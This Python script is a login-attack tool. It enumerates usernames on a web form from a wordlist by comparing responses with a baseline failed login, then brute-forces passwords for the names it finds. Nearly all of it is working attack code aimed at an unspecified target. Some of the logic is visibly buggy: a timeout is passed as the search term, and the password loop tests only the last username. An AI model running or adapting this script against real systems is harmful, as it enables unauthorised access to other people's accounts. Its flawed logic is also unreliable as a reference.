import requests

from io import BytesIO
from lxml import etree

TARGET = ''
TIMEOUT = 10
USERS_LIST = 'authentication/wordlists/usernames.txt'
PASSWORD_LIST = 'authentication/wordlists/passwords.txt'
USER_INPUT_NAME = 'username'
PASSWORD_INPUT_NAME = 'password'
SEARCH_TERM = 'Invalid username or password '

def enumerate_usernames(target, users_list, user_input_name, password_input_name, search_term, timeout=10):
    session = requests.Session()
    response = session.get(target, timeout=timeout)
    params = get_params(response.content)
    usernames = list()

    try:
        with open(users_list, 'r') as users:
            for user in users:
                usernames.append(user.strip())
    except FileNotFoundError:
        print('The file was not found')
    except Exception as e:
        print(f'An error occurred: {e}')

    params[user_input_name] = 'username'
    params[password_input_name] = 'password'
    failed_response = session.post(target, params, timeout=timeout)
    potential_usernames = list()

    for username in usernames:
        params[user_input_name] = username
        params[password_input_name] = 'password'

        test_response = session.post(target, params, timeout=timeout)

        if test_response.status_code != failed_response.status_code:
            potential_usernames.append(username)
            print(f'Possible username identifed: {username}')
            print(f'Regular failed login status code: {failed_response.status_code}')
            print(f'Login with username {username} status code: {test_response.status_code}')
        elif not search_tree(test_response.content, search_term):
            potential_usernames.append(username)
            print(f'Possible username identified: {username}')
            print(f'Text on failed login not present for {username}')
        else:
            print(f'No variance for username: {username}')

    print('\nPotential Usernames:')
    
    for potential_username in potential_usernames:
        print(potential_username)

    return potential_usernames

def enumerate_password(target, usernames, pwd_list, user_input_name, password_input_name, search_term, timeout=10):
    passwords = list()

    try:
        with open(pwd_list, 'r') as pwds:
            for pwd in pwds:
                passwords.append(pwd.strip())
    except FileNotFoundError:
        print('The file was not found')
    except Exception as e:
        print(f'An error occurred: {e}')

    session = requests.Session()
    response = session.get(target, timeout=timeout)
    data = get_params(response.content)

    data[user_input_name] = usernames[0]
    data[password_input_name] = 'password'
    failed_response = session.post(target, data, timeout=timeout)
    potential_credentials = list()

    for password in passwords:
        data[password_input_name] = password

        for username in usernames:
            data[user_input_name] = username

        test_response = session.post(target, data, timeout=timeout)

        if test_response.status_code != failed_response.status_code:
            potential_credentials.append({'user': username, 'pwd': password})
            print(f'Possible credentials identifed: user: {username} pwd: {password}')
            print(f'Regular failed login status code: {failed_response.status_code}')
            print(f'Login with username {username} and password {password} status code: {test_response.status_code}')
            session = requests.Session()
            session.get(target)
        elif not search_tree(test_response.content, search_term):
            potential_credentials.append({'user': username, 'pwd': password})
            print(f'Possible credentials identifed: user: {username} pwd: {password}')
            print(f'Text on failed login not present for {username} and password {password}')
            #session = requests.Session()
            #session.get(target)
        else:
            print(f'No variance for username: {username} and password: {password}')

    print('\nPotential Credentials')

    for potential_credential in potential_credentials:
        print(f'username: {potential_credential['user']} password: {potential_credential['pwd']}')
    
    return potential_credentials
    
def get_params(content):
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    for input_elem in tree.findall('.//input'):
        name = input_elem.get('name')

        if name is not None:
            params[name] = input_elem.get('value', None)
    
    return params

def search_tree(content, term):
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)

    return tree.xpath(f'.//*[text()=\'{term}\']')

if __name__ == '__main__':
    #enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, TIMEOUT)
    enumerate_password(
        TARGET,
        enumerate_usernames(TARGET, USERS_LIST, USER_INPUT_NAME, PASSWORD_INPUT_NAME, TIMEOUT),
        PASSWORD_LIST,
        USER_INPUT_NAME,
        PASSWORD_INPUT_NAME,
        SEARCH_TERM,
        TIMEOUT
    )